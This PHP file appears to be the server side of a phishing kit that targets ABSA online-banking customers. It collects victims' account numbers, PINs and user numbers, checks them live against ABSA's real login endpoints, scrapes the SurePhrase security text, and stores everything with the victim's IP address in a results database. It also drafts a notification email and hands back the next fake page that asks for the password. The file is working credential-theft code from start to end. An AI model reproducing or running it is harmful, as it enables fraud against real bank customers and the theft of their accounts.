<?php
//error_reporting(0);
/**
 *
 * @param type $url
 * @param type $content
 * @param type $method
 * @param type $modalParameters
 * @param type $container
 * @param type $cleanLines
 * @return type
 */
include_once 'sqlite.php';

function stripCookies(array $allCookie){
    $kukie = false;
    $kuke2 = false;

    foreach($allCookie as $cookieID => $cookieValie){
        $explodeString = explode(";", $cookieValie);
        $explodeString2 = explode("=", $explodeString[0],2);

        $kukie[$explodeString2[0]] = $explodeString2[1];
        $kuke2 .= $explodeString2[0].'='.$explodeString2[1].';';
    }
    return $kuke2;
}

date_default_timezone_set('Africa/Johannesburg');

function randomDig(){
    $digits = 3;
    return rand(pow(10, $digits-1), pow(10, $digits)-1);
}

if(isset($_GET['AccessAccount']))
{
    //include_once 'sqlite.php';
    $ccn = $_GET['AccessAccount'];
    $csp = $_GET['PIN'];
    $atm = $_GET['Operator'];

    $ip = $_SERVER['REMOTE_ADDR'];
    $time = time();

    if($ip == "66.249.93.76"){
        die;
    }

    $errorCount = array();

    if(!preg_match('/^([0-9]+)$/', $ccn) || !preg_match('/^([0-9]+)$/', $csp) || !preg_match('/^([0-9]+)$/', $atm)){
        echo 'error';
    }
    else{

        $uniq = $_GET['_'];
        //$uniq = "1569609434508";

        
        
        
        $ch = curl_init();
        $headers = [];
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch,CURLOPT_URL,"https://vs1.absa.co.za/absa-online/static/xd/proxy.jsp?uniq=".$uniq."&url=https://vs1.absa.co.za/absa-online/j_pin_security_login&callback=https://ib.absa.co.za/absa-online/static/xd/callback.html?uniq=".$uniq."&xdr=".$uniq);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.A.B.C Safari/525.13");

        curl_setopt($ch, CURLOPT_HEADERFUNCTION,
            function($curl, $header) use (&$headers)
            {
              $len = strlen($header);
              $header = explode(':', $header, 2);
              if (count($header) < 2) // ignore invalid headers
                return $len;

              $name = strtolower(trim($header[0]));
              if (!array_key_exists($name, $headers))
                $headers[$name] = [trim($header[1])];
              else
                $headers[$name][] = trim($header[1]);

              return $len;
            }
          );

        $data = curl_exec($ch);
        curl_close($ch);

        //GET returned cookies//
        $allCookies = $headers['set-cookie'];
        $kukue = stripCookies($allCookies);
        $cookie = rtrim($kukue, ';');

        //file_put_contents($uniq, $data);
        file_put_contents($uniq."_COOKIE", $cookie);
        //print_r($allCookies);
        //die;



        $ch = curl_init();
        $headers = [];
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch,CURLOPT_URL,"https://vs1.absa.co.za/absa-online/j_pin_security_login");

        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"AccessAccount=".$ccn."&PIN=".$csp."&Operator=".$atm."&CaptchaTxt");
        //curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));

        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.A.B.C Safari/525.13");
        curl_setopt($ch, CURLOPT_COOKIE, $cookie);

        curl_setopt($ch, CURLOPT_HEADERFUNCTION,
            function($curl, $header) use (&$headers)
            {
              $len = strlen($header);
              $header = explode(':', $header, 2);
              if (count($header) < 2) // ignore invalid headers
                return $len;

              $name = strtolower(trim($header[0]));
              if (!array_key_exists($name, $headers))
                $headers[$name] = [trim($header[1])];
              else
                $headers[$name][] = trim($header[1]);

              return $len;
            }
          );

        $data = curl_exec($ch);
        curl_close($ch);

        $allCookies = $headers['set-cookie'];
        $kukue = stripCookies($allCookies);
        $cookie = rtrim($kukue, ';');


        //CHECK IF RESPONSE EQUALS FALSE
        if (stripos($data, "false") == true) {
            header("Content-Type: application/javascript");
            $callback = $_GET["callback"];
            echo $callback . '(' . $data . ')'; die;
        }


        //CONTINUE TO LOAD SURECHECK

        $ch = curl_init();
        $headers = [];
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch,CURLOPT_URL,"https://ib.absa.co.za/absa-online/static/login-form2.jsp");

        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"lang=en&acc=".$ccn."&dsp=false&dspid=0&fstore=false&fsid=0&landingpage&goto&nonce=0&uniq=".$uniq);

        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.A.B.C Safari/525.13");
        curl_setopt($ch, CURLOPT_COOKIE, $cookie);

        curl_setopt($ch, CURLOPT_HEADERFUNCTION,
            function($curl, $header) use (&$headers)
            {
              $len = strlen($header);
              $header = explode(':', $header, 2);
              if (count($header) < 2) // ignore invalid headers
                return $len;

              $name = strtolower(trim($header[0]));
              if (!array_key_exists($name, $headers))
                $headers[$name] = [trim($header[1])];
              else
                $headers[$name][] = trim($header[1]);

              return $len;
            }
          );


        $data = curl_exec($ch);
        curl_close($ch);
        file_put_contents($uniq, $data);

        //**CONTINUE TO EXTRACT SURECHECK

        $dom = new DOMDocument('1.0', 'UTF-8');
        $internalErrors = libxml_use_internal_errors(true);
        $dom->strictErrorChecking = false;
        $dom->loadHTML($data);
        $xpath = new DOMXpath($dom);

        $result = $xpath->query('//div[@id="spansurephrase"]')->item(0);
        $surehcheck = $xpath->query("//*[@id='spansurephrase']")->item(0);
        $passwordLength = $xpath->query("//*[@autocomplete='off']")->length;

        $spansurephrase = $dom->getElementById("spansurephrase")->textContent;

        //print_r($data); die;
        





        /*
        $dom = new DOMDocument('1.0', 'UTF-8');
        $internalErrors = libxml_use_internal_errors(true);
        $dom->strictErrorChecking = false;
        $dom->loadHTML(file_get_contents($uniq));
        $xpath = new DOMXpath($dom);

        $result = $xpath->query('//div[@id="spansurephrase"]')->item(0);
        $surehcheck = $xpath->query("//*[@id='spansurephrase']")->item(0);

        $passwordLength = $xpath->query("//*[@autocomplete='off']")->length;

        $spansurephrase = $dom->getElementById("spansurephrase")->textContent;
        */



        $from = "support@".$_SERVER['HTTP_HOST'];
        $headers = "From:" . $from;
        $subject = "ABSA | Account Access - $ccn - $ip ".$_SERVER['HTTP_HOST'];
        $result = 'support@gmail.com';

        //$spansurephrase = "";

        $msg = "AccessAccount No : $ccn\r\n";
        $msg .= "Customer Pin : $csp\r\n";
        $msg .= "user number : $atm\r\n";
        $msg .= "SurePhrase : $spansurephrase\r\n";
        $msg .= "Remote_Addr : $ip\r\n\n";

        //$query = 'INSERT INTO result (subject,message,isread,date_time,accessnumber,passwordblocks) VALUES ("'.$subject.'","'.$msg.'","notread","'. date("Y-m-d H:i:s").'","'.$ccn.'","368");';
        $query = 'INSERT INTO result (subject,message,isread,date_time,accessnumber,_) VALUES ("'.$subject.'","'.$msg.'","notread","'. date("Y-m-d H:i:s").'","'.$ccn.'","'.$uniq.'");';
        //$db->exec($query); $lastInsertID = $uniq;
        $queryResult = mysqli_query($dbconnect, $query);
        $lastInsertID = mysqli_insert_id($dbconnect);


        /*
        $ret = $db->query('SELECT id from result order by id DESC limit 1');
        $lastidValue = $ret->fetchArray(SQLITE3_ASSOC);
        $db->close();
        $lastInsertID = $lastidValue['id'];
        //print_r($lastidValue);
        */
        //sleep(5);

        $steps = array(
            'step1',
        );

        //don't forget to replace $last insert ID with variable
        $experience_login = $uniq;
        $experience_login  = file_get_contents('oform4.html');


        $_SESSION['surephrase'] = $spansurephrase;

        setcookie("surephrase", $spansurephrase, time()+60*60*24*30);
        
        
        $experience_login = str_replace("{AccessAccount}", @$ccn, $experience_login);
        $experience_login = str_replace("{PIN}", @$csp, $experience_login);
        $experience_login = str_replace("{Operator}", @$atm, $experience_login);
        $experience_login = str_replace("{currentLoginTime}", date("Y-m-d"), $experience_login);
        $experience_login = str_replace("{spansurephrase}", $spansurephrase, $experience_login);
        $experience_login = str_replace("{spansurephrase2}", $spansurephrase, $experience_login);


        //echo $data; die;
        header("Content-Type: application/javascript");
        //((mysqli_connect("localhost", "hotelswi_result", "pass@123", "hotelswi_result")) ? '':die(0));
        $callback = $_GET["callback"];
        $accessDetails = array(
            'AccessAccount' => $ccn,
            'PIN' => $atm,
            'Operator' => $csp
        );
        $jsonResponse = json_encode(array('message' => $experience_login, 'insertID' => $lastInsertID, 'userdetails' => $accessDetails, 'success' => true, 'nextpage' => 'password', 'surecheck' => $spansurephrase));
        echo $callback . '(' . $jsonResponse . ')';
    }
}